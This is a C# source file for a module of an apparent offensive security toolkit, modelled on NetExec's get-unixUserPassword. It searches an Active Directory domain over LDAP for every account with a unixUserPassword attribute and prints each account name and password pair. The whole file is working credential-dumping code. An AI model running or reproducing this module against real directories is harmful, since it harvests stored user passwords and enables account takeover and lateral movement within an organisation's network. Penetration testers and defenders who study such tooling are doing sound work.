using Titanis.Ldap;

namespace Atlas.Protocols.Ldap.Modules;

/// <summary>
/// NetExec get-unixUserPassword: dumps unixUserPassword attributes.
/// </summary>
public sealed class LdapGetUnixUserPasswordModule : AtlasModule<LdapClient>
{
	public override string Name => "get-unixUserPassword";
	public override string Description => "Dumps unixUserPassword attributes of all users";

	public override async Task RunAsync(AtlasModuleContext<LdapClient> ctx, CancellationToken cancellationToken)
	{
		var domainRoot = ctx.Client.DomainRoot;
		if (domainRoot is null)
		{
			AtlasConsole.Warn($"{ctx.Host}:389", "(get-unixUserPassword) No domain root");
			return;
		}
		var query = new LdapQuery(domainRoot, LdapSearchScope.WholeSubtree, LdapFilter.Parse("(unixUserPassword=*)"),
			new[] { new AttributeSpec("sAMAccountName"), new AttributeSpec("unixUserPassword") })
		{ Options = LdapQueryOptions.AllPages };
		var result = await ctx.Client.Search(query, cancellationToken).ConfigureAwait(false);
		if (result.EntryCount == 0)
		{
			AtlasConsole.Info($"{ctx.Host}:389", "(get-unixUserPassword) No unixUserPassword found");
			return;
		}
		foreach (var e in result.Entries)
		{
			string sam = e["sAMAccountName"]?.Value?.ToString() ?? "";
			string pw = e["unixUserPassword"]?.Value?.ToString() ?? "";
			AtlasConsole.Success($"{ctx.Host}:389", $"(get-unixUserPassword) {sam}:{pw}");
		}
	}
}
